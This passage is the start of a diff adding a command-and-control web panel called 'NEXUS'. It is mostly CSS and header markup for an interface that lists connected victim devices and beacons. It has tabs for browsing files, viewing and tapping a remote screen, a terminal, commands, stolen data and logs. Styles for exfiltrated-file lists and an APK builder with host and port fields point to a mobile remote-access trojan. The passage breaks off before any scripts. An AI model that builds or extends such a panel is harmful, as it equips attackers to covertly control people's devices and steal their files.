@@ -1,0 +1,2109 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
+<meta http-equiv="Pragma" content="no-cache">
+<meta http-equiv="Expires" content="0">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>NEXUS — C2 Panel</title>
+<style>
+  @import url('https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@300;400;500;600;700&family=Inter:wght@300;400;500;600;700;800&display=swap');
+
+  :root {
+    --bg: #06080d; --bg2: #0c1018; --bg3: #121822; --bg4: #181f2c;
+    --surface: rgba(12,16,24,0.92); --surface2: rgba(18,24,34,0.85);
+    --border: rgba(56,189,248,0.06); --border-h: rgba(56,189,248,0.18);
+    --border-active: rgba(56,189,248,0.35);
+    --text: #e2e8f0; --text2: #64748b; --text3: #475569; --text4: #334155;
+    --accent: #38bdf8; --accent2: #0ea5e9; --accent-dim: rgba(56,189,248,0.08);
+    --accent-glow: rgba(56,189,248,0.12);
+    --green: #4ade80; --green-dim: rgba(74,222,128,0.08);
+    --red: #f43f5e; --red-dim: rgba(244,63,94,0.08);
+    --orange: #fb923c; --orange-dim: rgba(251,146,60,0.08);
+    --purple: #a78bfa; --purple-dim: rgba(167,139,250,0.08);
+    --cyan: #22d3ee;
+    --glass: rgba(12,16,24,0.88);
+    --r: 8px; --r2: 12px; --r3: 16px;
+    --shadow: 0 4px 24px rgba(0,0,0,0.3), 0 1px 3px rgba(0,0,0,0.2);
+    --shadow-lg: 0 8px 40px rgba(0,0,0,0.4);
+    --transition: 0.15s cubic-bezier(0.4, 0, 0.2, 1);
+  }
+
+  * { margin: 0; padding: 0; box-sizing: border-box; }
+
+  body {
+    font-family: 'Inter', -apple-system, sans-serif;
+    background: var(--bg);
+    color: var(--text);
+    overflow: hidden;
+    height: 100vh;
+    -webkit-font-smoothing: antialiased;
+  }
+
+  body::before {
+    content: '';
+    position: fixed; inset: 0;
+    background:
+      radial-gradient(ellipse at 20% 30%, rgba(56,189,248,0.04) 0%, transparent 50%),
+      radial-gradient(ellipse at 80% 70%, rgba(167,139,250,0.03) 0%, transparent 50%);
+    pointer-events: none; z-index: 0;
+  }
+
+  ::-webkit-scrollbar { width: 4px; }
+  ::-webkit-scrollbar-track { background: transparent; }
+  ::-webkit-scrollbar-thumb { background: var(--border-h); border-radius: 4px; }
+  ::-webkit-scrollbar-thumb:hover { background: var(--border-active); }
+
+  .header {
+    position: relative; z-index: 10;
+    background: var(--surface);
+    backdrop-filter: blur(24px) saturate(1.2);
+    border-bottom: 1px solid var(--border);
+    padding: 0 24px;
+    height: 52px;
+    display: flex; align-items: center; justify-content: space-between;
+  }
+
+  .header-left { display: flex; align-items: center; gap: 16px; }
+  .logo {
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 13px; font-weight: 700; letter-spacing: 4px;
+    background: linear-gradient(135deg, var(--accent) 0%, var(--purple) 100%);
+    -webkit-background-clip: text; -webkit-text-fill-color: transparent;
+  }
+  .logo-sub {
+    font-size: 9px; color: var(--text3); letter-spacing: 1px;
+    font-weight: 500; margin-left: -2px;
+  }
+
+  .header-center { display: flex; align-items: center; gap: 12px; }
+  .target-wrap {
+    display: flex; align-items: center; gap: 8px;
+    background: var(--bg3); border: 1px solid var(--border);
+    padding: 0 6px 0 14px; border-radius: var(--r);
+    transition: border-color var(--transition);
+  }
+  .target-wrap:focus-within { border-color: var(--accent); }
+  .target-wrap label {
+    font-size: 9px; color: var(--text3); font-weight: 700;
+    letter-spacing: 1.5px; white-space: nowrap;
+  }
+  .target-sel {
+    padding: 8px 8px; background: transparent; border: none;
+    color: var(--text); font-size: 12px; font-family: 'JetBrains Mono', monospace;
+    cursor: pointer; min-width: 200px; font-weight: 500;
+  }
+  .target-sel:focus { outline: none; }
+  .target-sel option { background: var(--bg2); color: var(--text); }
+
+  .header-stats { display: flex; gap: 24px; align-items: center; }
+  .stat {
+    display: flex; align-items: center; gap: 6px;
+    font-size: 10px; color: var(--text3); font-weight: 600; letter-spacing: 0.5px;
+  }
+  .stat-val {
+    font-family: 'JetBrains Mono', monospace; font-weight: 700; font-size: 14px;
+  }
+  .stat-val.g { color: var(--green); }
+  .stat-val.a { color: var(--accent); }
+  .live-indicator {
+    display: flex; align-items: center; gap: 6px;
+    font-size: 10px; font-weight: 600; color: var(--green);
+    letter-spacing: 1px;
+  }
+  .live-dot {
+    width: 6px; height: 6px; border-radius: 50%; background: var(--green);
+    box-shadow: 0 0 8px var(--green), 0 0 16px rgba(74,222,128,0.3);
+    animation: pulse 2s ease infinite;
+  }
+  @keyframes pulse {
+    0%, 100% { opacity: 1; transform: scale(1); }
+    50% { opacity: 0.5; transform: scale(0.85); }
+  }
+
+  .layout {
+    position: relative; z-index: 1;
+    display: grid;
+    grid-template-columns: 240px 1fr;
+    height: calc(100vh - 52px);
+  }
+
+  .sidebar {
+    background: var(--surface);
+    backdrop-filter: blur(16px);
+    border-right: 1px solid var(--border);
+    display: flex; flex-direction: column;
+    overflow: hidden;
+  }
+  .sb-title {
+    padding: 14px 18px;
+    font-size: 9px; font-weight: 700; letter-spacing: 2px; text-transform: uppercase;
+    color: var(--text3);
+    display: flex; justify-content: space-between; align-items: center;
+    border-bottom: 1px solid var(--border);
+    background: var(--bg2);
+  }
+  .sb-count {
+    font-family: 'JetBrains Mono', monospace; font-size: 11px; font-weight: 700;
+    color: var(--accent); background: var(--accent-dim);
+    padding: 2px 10px; border-radius: 20px;
+    border: 1px solid rgba(56,189,248,0.12);
+  }
+  .dev-list { flex: 1; overflow-y: auto; padding: 4px; }
+
+  .dev-card {
+    padding: 12px 14px; margin: 2px 0;
+    border-radius: var(--r);
+    cursor: pointer;
+    transition: all var(--transition);
+    border: 1px solid transparent;
+  }
+  .dev-card:hover { background: var(--accent-dim); border-color: var(--border); }
+  .dev-card.active {
+    background: linear-gradient(135deg, rgba(56,189,248,0.1), rgba(167,139,250,0.05));
+    border-color: var(--border-active);
+    box-shadow: inset 0 0 20px rgba(56,189,248,0.03);
+  }
+  .dev-top {
+    display: flex; align-items: center; gap: 8px;
+    font-size: 12px; font-weight: 600; margin-bottom: 6px;
+  }
+  .dev-dot { width: 7px; height: 7px; border-radius: 50%; flex-shrink: 0; }
+  .dev-dot.on { background: var(--green); box-shadow: 0 0 6px var(--green); }
+  .dev-dot.off { background: var(--orange); }
+  .tn-badge {
+    font-size: 8px; font-weight: 700; letter-spacing: 0.5px;
+    color: var(--green); background: var(--green-dim);
+    border: 1px solid rgba(74,222,128,0.15);
+    padding: 1px 8px; border-radius: 20px; margin-left: auto;
+  }
+  .dev-info {
+    font-size: 10px; color: var(--text3); line-height: 1.7;
+    display: grid; grid-template-columns: 1fr 1fr; gap: 0 8px;
+  }
+  .dev-info .mi { margin-right: 4px; font-size: 10px; }
+  .dev-ip {
+    grid-column: 1 / -1;
+    font-family: 'JetBrains Mono', monospace; font-size: 10px;
+    color: var(--accent); opacity: 0.5; margin-top: 2px;
+  }
+
+  .main { display: flex; flex-direction: column; overflow: hidden; background: var(--bg); }
+
+  .main-tabs {
+    display: flex; gap: 0;
+    background: var(--surface);
+    backdrop-filter: blur(12px);
+    border-bottom: 1px solid var(--border);
+    padding: 0 4px;
+    flex-shrink: 0;
+  }
+  .mtab {
+    padding: 12px 18px; font-size: 11px; font-weight: 600;
+    letter-spacing: 0.3px; color: var(--text3); cursor: pointer;
+    border-bottom: 2px solid transparent;
+    transition: all var(--transition); position: relative;
+    display: flex; align-items: center; gap: 8px;
+    white-space: nowrap;
+  }
+  .mtab:hover { color: var(--text2); background: var(--accent-dim); }
+  .mtab.active {
+    color: var(--accent); border-bottom-color: var(--accent);
+    background: linear-gradient(to bottom, var(--accent-dim), transparent);
+  }
+  .mtab .mi { font-size: 14px; }
+  .mtab .badge {
+    width: 6px; height: 6px; border-radius: 50%;
+    background: var(--red); box-shadow: 0 0 6px var(--red);
+    display: none;
+  }
+
+  .tab-content { flex: 1; overflow: hidden; }
+  .tpage { height: 100%; overflow-y: auto; display: none; }
+  .tpage.active { display: flex; flex-direction: column; }
+
+  .inp {
+    background: var(--bg3); border: 1px solid var(--border);
+    color: var(--text); padding: 8px 12px; border-radius: var(--r);
+    font-size: 12px; font-family: 'Inter', sans-serif;
+    outline: none; transition: border-color var(--transition);
+    flex: 1; min-width: 0;
+  }
+  .inp:focus { border-color: var(--accent); box-shadow: 0 0 0 2px var(--accent-dim); }
+  .inp::placeholder { color: var(--text4); }
+
+  .btn-primary {
+    padding: 8px 18px; border: none; border-radius: var(--r);
+    font-size: 12px; font-weight: 600; cursor: pointer;
+    font-family: 'Inter', sans-serif;
+    background: linear-gradient(135deg, var(--accent2), var(--accent));
+    color: #000; transition: all var(--transition);
+    white-space: nowrap;
+  }
+  .btn-primary:hover { box-shadow: 0 0 20px rgba(56,189,248,0.25); transform: translateY(-1px); }
+  .btn-primary:active { transform: translateY(0); }
+  .btn-primary:disabled { opacity: 0.4; cursor: not-allowed; transform: none; }
+
+  .btn-ghost {
+    padding: 6px 14px; border: 1px solid var(--border);
+    border-radius: var(--r); background: transparent;
+    color: var(--text2); font-size: 11px; font-weight: 600;
+    cursor: pointer; font-family: 'Inter', sans-serif;
+    transition: all var(--transition);
+  }
+  .btn-ghost:hover { border-color: var(--accent); color: var(--accent); background: var(--accent-dim); }
+
+  .fm { display: flex; flex-direction: column; height: 100%; overflow: hidden; }
+  .fm-toolbar {
+    display: flex; align-items: center; gap: 8px;
+    padding: 10px 16px;
+    background: var(--surface);
+    border-bottom: 1px solid var(--border);
+    flex-shrink: 0;
+  }
+  .fm-tbtn {
+    width: 32px; height: 32px; display: flex; align-items: center; justify-content: center;
+    background: var(--bg3); border: 1px solid var(--border); border-radius: var(--r);
+    color: var(--text2); font-size: 14px; cursor: pointer;
+    transition: all var(--transition);
+  }
+  .fm-tbtn:hover { border-color: var(--accent); color: var(--accent); background: var(--accent-dim); }
+  .fm-breadcrumb {
+    display: flex; align-items: center; gap: 2px;
+    flex: 1; overflow-x: auto; white-space: nowrap;
+    font-size: 12px; scrollbar-width: none;
+  }
+  .fm-breadcrumb::-webkit-scrollbar { display: none; }
+  .bc-seg {
+    padding: 4px 8px; border-radius: 4px; color: var(--text2);
+    cursor: pointer; transition: all var(--transition);
+    font-family: 'JetBrains Mono', monospace; font-size: 11px;
+  }
+  .bc-seg:hover { background: var(--accent-dim); color: var(--accent); }
+  .bc-seg.current { color: var(--accent); font-weight: 600; }
+  .bc-sep { color: var(--text4); font-size: 10px; padding: 0 1px; }
+
+  .fm-body { flex: 1; overflow-y: auto; padding: 8px; }
+  .fm-grid {
+    display: grid;
+    grid-template-columns: repeat(auto-fill, minmax(110px, 1fr));
+    gap: 6px;
+  }
+  .fm-item {
+    display: flex; flex-direction: column; align-items: center; gap: 4px;
+    padding: 14px 8px 10px; border-radius: var(--r);
+    cursor: pointer; transition: all var(--transition); position: relative;
+    border: 1px solid transparent;
+    text-align: center;
+  }
+  .fm-item:hover { background: var(--accent-dim); border-color: var(--border); }
+  .fm-item.dir:hover { background: rgba(56,189,248,0.08); }
+  .fm-item.selected { background: var(--accent-dim); border-color: var(--border-active); }
+  .fm-icon { font-size: 28px; line-height: 1; }
+  .fm-name {
+    font-size: 10px; color: var(--text); font-weight: 500;
+    overflow: hidden; text-overflow: ellipsis; white-space: nowrap;
+    max-width: 100%; line-height: 1.3;
+  }
+  .fm-size { font-size: 9px; color: var(--text3); font-family: 'JetBrains Mono', monospace; }
+  .fm-actions {
+    position: absolute; top: 4px; right: 4px;
+    display: none; gap: 2px;
+  }
+  .fm-item:hover .fm-actions { display: flex; }
+  .fm-act {
+    width: 22px; height: 22px; display: flex; align-items: center; justify-content: center;
+    border-radius: 4px; cursor: pointer; font-size: 11px;
+    background: var(--bg3); border: 1px solid var(--border);
+    transition: all var(--transition);
+  }
+  .fm-act:hover { border-color: var(--accent); background: var(--accent-dim); }
+  .fm-act.grab:hover { border-color: var(--green); background: var(--green-dim); }
+
+  .fm-list { font-size: 12px; }
+  .fm-lrow {
+    display: grid; grid-template-columns: 28px 1fr 80px 120px 30px;
+    align-items: center; gap: 8px;
+    padding: 6px 12px; border-radius: 4px;
+    cursor: pointer; transition: all var(--transition);
+  }
+  .fm-lrow:hover { background: var(--accent-dim); }
+  .fm-lrow.dir:hover { background: rgba(56,189,248,0.06); }
+  .fm-lrow.header {
+    font-size: 10px; font-weight: 700; color: var(--text3);
+    letter-spacing: 0.5px; cursor: default; text-transform: uppercase;
+    border-bottom: 1px solid var(--border); margin-bottom: 4px;
+  }
+  .fm-lrow.header:hover { background: transparent; }
+  .fm-lrow .li { text-align: center; font-size: 14px; }
+  .fm-lrow .ln {
+    overflow: hidden; text-overflow: ellipsis; white-space: nowrap;
+    font-weight: 500;
+  }
+  .fm-lrow .ls {
+    text-align: right; font-family: 'JetBrains Mono', monospace;
+    font-size: 10px; color: var(--text3);
+  }
+  .fm-lrow .lm { font-size: 10px; color: var(--text3); }
+  .fm-lrow .la { text-align: center; }
+
+  .fm-status {
+    display: flex; justify-content: space-between; align-items: center;
+    padding: 6px 16px; font-size: 10px; color: var(--text3);
+    font-family: 'JetBrains Mono', monospace;
+    background: var(--surface); border-top: 1px solid var(--border);
+    flex-shrink: 0;
+  }
+
+  .fm-empty, .fm-loading {
+    display: flex; flex-direction: column; align-items: center;
+    justify-content: center; height: 100%; gap: 8px;
+    color: var(--text3); font-size: 12px;
+  }
+  .fm-empty .big, .fm-loading .big { font-size: 40px; opacity: 0.2; }
+
+  .screen-container { display: flex; flex-direction: column; height: 100%; }
+  .screen-toolbar {
+    display: flex; align-items: center; gap: 8px; padding: 8px 14px;
+    background: var(--surface); border-bottom: 1px solid var(--border); flex-shrink: 0;
+  }
+  .screen-toolbar .btn-screen {
+    padding: 6px 16px; font-size: 11px; font-weight: 600;
+    border-radius: var(--r); border: 1px solid var(--border);
+    background: var(--bg3); color: var(--text2); cursor: pointer;
+    font-family: 'Inter', sans-serif; transition: all var(--transition);
+  }
+  .screen-toolbar .btn-screen:hover { border-color: var(--accent); color: var(--accent); }
+  .screen-toolbar .btn-screen.active { background: var(--accent); color: #000; border-color: var(--accent); }
+  .screen-toolbar .btn-screen.stop { background: var(--red); color: #fff; border-color: var(--red); }
+  .screen-status { font-size: 10px; color: var(--text3); margin-left: auto; font-family: 'JetBrains Mono', monospace; }
+  .screen-view {
+    flex: 1; display: flex; justify-content: center; align-items: center;
+    overflow: hidden; background: #050508; position: relative;
+  }
+  .screen-view img {
+    max-width: 100%; max-height: 100%; object-fit: contain; cursor: crosshair;
+    border-radius: 4px; transition: opacity 0.15s;
+  }
+  .screen-view .no-screen {
+    color: var(--text3); font-size: 12px; text-align: center; line-height: 2;
+  }
+  .screen-view .no-screen .big { font-size: 48px; opacity: 0.15; margin-bottom: 12px; }
+  .screen-controls {
+    display: flex; align-items: center; gap: 6px; padding: 8px 14px;
+    background: var(--surface); border-top: 1px solid var(--border); flex-shrink: 0;
+  }
+  .screen-controls .btn-ctrl {
+    padding: 6px 14px; font-size: 16px; border-radius: var(--r);
+    border: 1px solid var(--border); background: var(--bg3);
+    color: var(--text2); cursor: pointer; transition: all var(--transition);
+  }
+  .screen-controls .btn-ctrl:hover { border-color: var(--accent); color: var(--accent); }
+  .screen-controls .btn-ctrl:active { transform: scale(0.95); }
+  .screen-controls .text-input {
+    flex: 1; padding: 6px 12px; font-size: 12px; border-radius: var(--r);
+    border: 1px solid var(--border); background: var(--bg3);
+    color: var(--text); font-family: 'JetBrains Mono', monospace;
+    outline: none; transition: border-color var(--transition);
+  }
+  .screen-controls .text-input:focus { border-color: var(--accent); }
+  .screen-controls .btn-send-text {
+    padding: 6px 14px; font-size: 11px; font-weight: 600;
+    border-radius: var(--r); border: 1px solid rgba(56,189,248,0.2);
+    background: var(--accent-dim); color: var(--accent); cursor: pointer;
+    font-family: 'Inter', sans-serif; transition: all var(--transition);
+  }
+  .screen-controls .btn-send-text:hover { background: rgba(56,189,248,0.15); border-color: var(--accent); }
+  .screen-tap-marker {
+    position: absolute; width: 20px; height: 20px; border-radius: 50%;
+    border: 2px solid var(--accent); background: rgba(56,189,248,0.2);
+    transform: translate(-50%, -50%); pointer-events: none;
+    animation: tapPulse 0.5s ease-out forwards;
+  }
+  @keyframes tapPulse {
+    0% { transform: translate(-50%, -50%) scale(0.5); opacity: 1; }
+    100% { transform: translate(-50%, -50%) scale(2.5); opacity: 0; }
+  }
+
+  .term-container {
+    display: flex; flex-direction: column; height: 100%;
+    background: #0a0c10;
+  }
+  .term-toolbar {
+    display: flex; align-items: center; justify-content: space-between;
+    padding: 10px 16px; background: var(--surface);
+    border-bottom: 1px solid var(--border); flex-shrink: 0;
+  }
+  .term-title {
+    font-size: 12px; font-weight: 600; color: var(--text2);
+    display: flex; align-items: center; gap: 8px;
+  }
+  .term-title span { color: var(--accent); font-family: 'JetBrains Mono', monospace; font-size: 11px; }
+  .term-clear-btn {
+    font-size: 9px; font-weight: 700; letter-spacing: 1px;
+    padding: 4px 12px; border-radius: 4px;
+    border: 1px solid rgba(244,63,94,0.2); background: var(--red-dim);
+    color: var(--red); cursor: pointer; transition: all var(--transition);
+  }
+  .term-clear-btn:hover { background: rgba(244,63,94,0.15); border-color: var(--red); }
+
+  .term-output {
+    flex: 1; overflow-y: auto; padding: 16px;
+    font-family: 'JetBrains Mono', monospace; font-size: 12px;
+    line-height: 1.7;
+  }
+  .term-welcome { color: var(--text4); font-style: italic; font-size: 11px; }
+  .term-cmd-line { color: var(--green); margin-top: 8px; }
+  .term-cmd-text { color: var(--text); font-weight: 500; }
+  .term-stdout { color: var(--text); white-space: pre-wrap; word-break: break-all; }
+  .term-stderr { color: var(--orange); white-space: pre-wrap; word-break: break-all; }
+  .term-error { color: var(--red); }
+  .term-exit.ok { color: var(--green); font-size: 10px; opacity: 0.5; }
+  .term-exit.fail { color: var(--red); font-size: 10px; }
+  .term-spinner { color: var(--text3); animation: blink 1s ease infinite; }
+  @keyframes blink { 0%, 100% { opacity: 1; } 50% { opacity: 0.3; } }
+
+  .term-input-row {
+    display: flex; align-items: center; gap: 8px;
+    padding: 10px 16px; background: var(--bg2);
+    border-top: 1px solid var(--border); flex-shrink: 0;
+  }
+  .term-prompt {
+    color: var(--green); font-family: 'JetBrains Mono', monospace;
+    font-weight: 700; font-size: 14px;
+  }
+  .term-input {
+    flex: 1; background: transparent; border: none; outline: none;
+    color: var(--text); font-family: 'JetBrains Mono', monospace;
+    font-size: 13px; caret-color: var(--accent);
+  }
+  .term-send-btn {
+    background: transparent; border: 1px solid rgba(74,222,128,0.2);
+    color: var(--green); font-size: 14px; padding: 4px 12px; border-radius: 4px;
+    cursor: pointer; transition: all var(--transition);
+  }
+  .term-send-btn:hover { background: var(--green-dim); border-color: var(--green); }
+
+  .cmd-page {
+    padding: 20px; max-width: 800px; margin: 0 auto; width: 100%;
+    display: flex; flex-direction: column; gap: 16px;
+  }
+  .cmd-group {
+    background: var(--surface); border: 1px solid var(--border);
+    border-radius: var(--r2); padding: 18px; overflow: hidden;
+    transition: border-color var(--transition);
+  }
+  .cmd-group:hover { border-color: var(--border-h); }
+  .cmd-group-title {
+    font-size: 10px; font-weight: 700; letter-spacing: 2px;
+    text-transform: uppercase; color: var(--text3);
+    margin-bottom: 14px; padding-bottom: 10px;
+    border-bottom: 1px solid var(--border);
+  }
+  .cmd-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 8px; }
+  .cmd-btn {
+    display: flex; align-items: center; gap: 12px;
+    padding: 14px 16px; background: var(--bg3);
+    border: 1px solid var(--border); border-radius: var(--r);
+    color: var(--text); cursor: pointer; font-family: 'Inter', sans-serif;
+    transition: all var(--transition); text-align: left;
+  }
+  .cmd-btn:hover {
+    border-color: var(--accent); background: var(--accent-dim);
+    transform: translateY(-1px); box-shadow: 0 4px 12px rgba(0,0,0,0.2);
+  }
+  .cmd-btn.waiting { border-color: var(--orange); animation: blink 1s ease infinite; }
+  .cmd-btn .ci { font-size: 22px; flex-shrink: 0; }
+  .cmd-btn .ct { font-size: 12px; font-weight: 600; line-height: 1.4; }
+  .cmd-btn .cd { display: block; font-size: 10px; font-weight: 400; color: var(--text3); margin-top: 2px; }
+
+  .input-row { display: flex; gap: 8px; }
+  .inp-btn {
+    width: 42px; height: 42px; display: flex; align-items: center; justify-content: center;
+    background: var(--accent-dim); border: 1px solid rgba(56,189,248,0.15);
+    border-radius: var(--r); color: var(--accent); font-size: 16px;
+    cursor: pointer; font-family: 'Inter', sans-serif;
+    transition: all var(--transition); flex-shrink: 0;
+  }
+  .inp-btn:hover { background: rgba(56,189,248,0.15); border-color: var(--accent); }
+
+  .push-area { display: flex; flex-direction: column; gap: 8px; }
+  .push-area input[type="file"] {
+    font-size: 11px; color: var(--text2);
+    font-family: 'Inter', sans-serif;
+  }
+
+  .feedback {
+    margin-top: 10px; padding: 8px 14px; border-radius: var(--r);
+    font-size: 11px; font-weight: 500;
+    opacity: 0; transform: translateY(-4px);
+    transition: all 0.3s ease;
+  }
+  .feedback.show { opacity: 1; transform: translateY(0); }
+  .feedback.wait { background: var(--orange-dim); color: var(--orange); border: 1px solid rgba(251,146,60,0.15); }
+  .feedback.ok { background: var(--green-dim); color: var(--green); border: 1px solid rgba(74,222,128,0.15); }
+
+  .dv { padding: 20px; overflow-y: auto; }
+  .dv-header {
+    display: flex; align-items: center; gap: 12px; margin-bottom: 20px;
+    padding-bottom: 14px; border-bottom: 1px solid var(--border);
+  }
+  .dv-header h3 { font-size: 16px; font-weight: 700; }
+  .dv-raw-btn {
+    margin-left: auto; padding: 4px 12px; border-radius: var(--r);
+    font-size: 10px; font-weight: 600; letter-spacing: 0.5px;
+    background: var(--bg3); border: 1px solid var(--border);
+    color: var(--text3); cursor: pointer; transition: all var(--transition);
+    font-family: 'JetBrains Mono', monospace;
+  }
+  .dv-raw-btn:hover { border-color: var(--accent); color: var(--accent); }
+  .raw-json {
+    display: none; background: var(--bg2); border: 1px solid var(--border);
+    padding: 16px; border-radius: var(--r); margin-top: 16px;
+    font-family: 'JetBrains Mono', monospace; font-size: 11px;
+    white-space: pre-wrap; word-break: break-all; color: var(--text2);
+    max-height: 400px; overflow-y: auto;
+  }
+  .raw-json.show { display: block; }
+
+  .dv-section {
+    background: var(--surface); border: 1px solid var(--border);
+    border-radius: var(--r2); margin-bottom: 12px; overflow: hidden;
+  }
+  .dv-section-head {
+    padding: 12px 16px; font-size: 12px; font-weight: 700;
+    display: flex; align-items: center; gap: 8px;
+    background: var(--bg2); border-bottom: 1px solid var(--border);
+    color: var(--text2);
+  }
+  .dv-section-head .icon { font-size: 15px; }
+  .dv-table { width: 100%; border-collapse: collapse; }
+  .dv-table td { padding: 6px 16px; font-size: 12px; border-bottom: 1px solid var(--border); }
+  .dv-table .lbl { color: var(--text3); font-weight: 600; width: 140px; font-size: 11px; }
+  .dv-table .val { color: var(--text); }
+  .dv-table .val.hi { font-family: 'JetBrains Mono', monospace; font-size: 11px; color: var(--accent); word-break: break-all; }
+
+  .apps-tbl { width: 100%; border-collapse: collapse; font-size: 11px; }
+  .apps-tbl th {
+    padding: 8px 12px; text-align: left; font-size: 10px;
+    font-weight: 700; letter-spacing: 0.5px; color: var(--text3);
+    border-bottom: 1px solid var(--border);
+    background: var(--bg2);
+  }
+  .apps-tbl td { padding: 5px 12px; border-bottom: 1px solid var(--border); }
+  .apps-tbl .pkg { font-family: 'JetBrains Mono', monospace; font-size: 10px; color: var(--text2); }
+
+  .log-page { padding: 8px; }
+  .log-row {
+    display: grid; grid-template-columns: 80px 130px 120px 1fr;
+    align-items: center; gap: 12px;
+    padding: 8px 14px; border-radius: var(--r);
+    font-size: 11px; cursor: pointer;
+    transition: all var(--transition);
+    border: 1px solid transparent;
+  }
+  .log-row:hover { background: var(--accent-dim); border-color: var(--border); }
+  .log-row.flash { animation: flashIn 1s ease; }
+  @keyframes flashIn {
+    0% { background: rgba(56,189,248,0.15); }
+    100% { background: transparent; }
+  }
+  .log-time {
+    font-family: 'JetBrains Mono', monospace; font-size: 10px; color: var(--text3);
+  }
+  .log-tag {
+    display: inline-block; padding: 2px 10px; border-radius: 20px;
+    font-size: 9px; font-weight: 700; letter-spacing: 0.5px;
+    text-transform: uppercase;
+  }
+  .log-tag-heartbeat { background: var(--accent-dim); color: var(--accent); }
+  .log-tag-initial_full_dump { background: var(--green-dim); color: var(--green); }
+  .log-tag-task_response { background: var(--purple-dim); color: var(--purple); }
+  .log-tag-task_ack { background: var(--orange-dim); color: var(--orange); }
+  .log-tag-file_upload { background: var(--green-dim); color: var(--green); }
+  .log-device { font-weight: 600; color: var(--text2); overflow: hidden; text-overflow: ellipsis; white-space: nowrap; }
+  .log-summary { color: var(--text3); overflow: hidden; text-overflow: ellipsis; white-space: nowrap; }
+
+  .tools-page { padding: 24px; max-width: 700px; margin: 0 auto; width: 100%; }
+  .tool-section {
+    margin-bottom: 16px; padding: 20px;
+    background: var(--surface); border: 1px solid var(--border);
+    border-radius: var(--r2); transition: border-color var(--transition);
+  }
+  .tool-section:hover { border-color: var(--border-h); }
+  .tool-title {
+    font-size: 10px; font-weight: 700; letter-spacing: 2px;
+    text-transform: uppercase; color: var(--text3);
+    margin-bottom: 14px; padding-bottom: 10px;
+    border-bottom: 1px solid var(--border);
+    display: flex; align-items: center; gap: 8px;
+  }
+  .exfil-list { max-height: 250px; overflow-y: auto; }
+  .exfil-row {
+    display: flex; align-items: center; gap: 10px;
+    padding: 8px 0; border-bottom: 1px solid var(--border);
+    font-size: 11px;
+  }
+  .exfil-row:last-child { border-bottom: none; }
+  .exfil-row .en {
+    flex: 1; overflow: hidden; text-overflow: ellipsis; white-space: nowrap;
+    color: var(--green); font-weight: 500;
+  }
+  .exfil-row .em { color: var(--text3); font-size: 10px; white-space: nowrap; font-family: 'JetBrains Mono', monospace; }
+  .exfil-row a {
+    color: var(--accent); text-decoration: none; font-size: 10px; font-weight: 600;
+    padding: 3px 12px; border-radius: 20px;
+    border: 1px solid rgba(56,189,248,0.12);
+    transition: all var(--transition);
+  }
+  .exfil-row a:hover { background: var(--accent-dim); border-color: var(--accent); }
+
+  .apk-inputs { display: flex; gap: 0; margin-bottom: 10px; }
+  .apk-inputs .inp:first-child { border-radius: var(--r) 0 0 var(--r); }
+  .apk-inputs .inp-port { width: 70px; border-radius: 0 var(--r) var(--r) 0; border-left: none; }
+  .btn-build {
+    width: 100%; padding: 12px; border: none; border-radius: var(--r);
+    font-size: 12px; font-weight: 700; cursor: pointer;
+    font-family: 'Inter', sans-serif;
+    background: linear-gradient(135deg, var(--accent2), var(--accent));
+    color: #000; transition: all var(--transition);
+    letter-spacing: 0.5px;
+  }
+  .btn-build:hover { box-shadow: 0 0 24px rgba(56,189,248,0.25); transform: translateY(-1px); }
+  .btn-build:disabled { opacity: 0.4; cursor: not-allowed; transform: none; }
+  .btn-dl {
+    width: 100%; padding: 12px; border: none; border-radius: var(--r);
+    font-size: 12px; font-weight: 700; cursor: pointer;
+    font-family: 'Inter', sans-serif;
+    margin-top: 8px; display: none;
+    background: linear-gradient(135deg, #16a34a, var(--green));
+    color: #000; transition: all var(--transition);
+    letter-spacing: 0.5px;
+  }
+  .btn-dl:hover { box-shadow: 0 0 24px rgba(74,222,128,0.25); }
+  .build-info { margin-top: 10px; font-size: 11px; color: var(--text2); }
+  .build-info.err { color: var(--red); }
+  .build-info.ok { color: var(--green); }
+
+  .spinner {
+    display: inline-block; width: 12px; height: 12px;
+    border: 2px solid var(--text4); border-top-color: var(--accent);
+    border-radius: 50%; animation: spin 0.6s linear infinite;
+    vertical-align: middle; margin-right: 6px;
+  }
+  @keyframes spin { to { transform: rotate(360deg); } }
+
+  .empty-state {
+    text-align: center; padding: 60px 30px;
+    color: var(--text3); font-size: 12px;
+  }
+  .empty-state .big { font-size: 40px; margin-bottom: 12px; opacity: 0.15; }
+</style>
+</head>
+<body>
+
+<div class="header">
+  <div class="header-left">
+    <div>
+      <div class="logo">NEXUS</div>
+      <div class="logo-sub">C2 PANEL</div>
+    </div>
+  </div>
+  <div class="header-center">
+    <div class="target-wrap">
+      <label>TARGET</label>
+      <select class="target-sel" id="targetSelect" onchange="onTargetChange(this.value)">
+        <option value="">— select device —</option>
+      </select>
+    </div>
+  </div>
+  <div class="header-stats">
+    <div class="stat">DEVICES <span class="stat-val g" id="deviceCount">0</span></div>
+    <div class="stat">BEACONS <span class="stat-val a" id="beaconCount">0</span></div>
+    <div class="live-indicator"><span class="live-dot"></span> LIVE</div>
+  </div>
+</div>
+
+<div class="layout">
+
+  <div class="sidebar">
+    <div class="sb-title">CONNECTED <span class="sb-count" id="devBadge">0</span></div>
+    <div class="dev-list" id="devicesList">
+      <div class="empty-state"><div class="big">📡</div>Waiting for connections...</div>
+    </div>
+  </div>
+
+  <div class="main">
+    <div class="main-tabs">
+      <div class="mtab active" data-tab="files"><span class="mi">📁</span> FILES</div>
+      <div class="mtab" data-tab="screen"><span class="mi">🖥️</span> SCREEN</div>
+      <div class="mtab" data-tab="terminal"><span class="mi">💻</span> TERMINAL</div>
+      <div class="mtab" data-tab="commands"><span class="mi">⚡</span> COMMANDS</div>
+      <div class="mtab" data-tab="data"><span class="mi">📊</span> DATA <span class="badge" id="dataBadge"></span></div>
+      <div class="mtab" data-tab="log"><span class="mi">📶</span> LOG</div>
+      <div class="mtab" data-tab="tools"><span class="mi">🔧</span> TOOLS</div>
+    </div>
+
+    <div class="tab-content">
+
+      <div class="tpage active" id="page-files">
+        <div class="fm" id="fileManager">
+          <div class="fm-toolbar">
+            <button class="fm-tbtn" onclick="fmGoUp()" title="Go up">⬆</button>
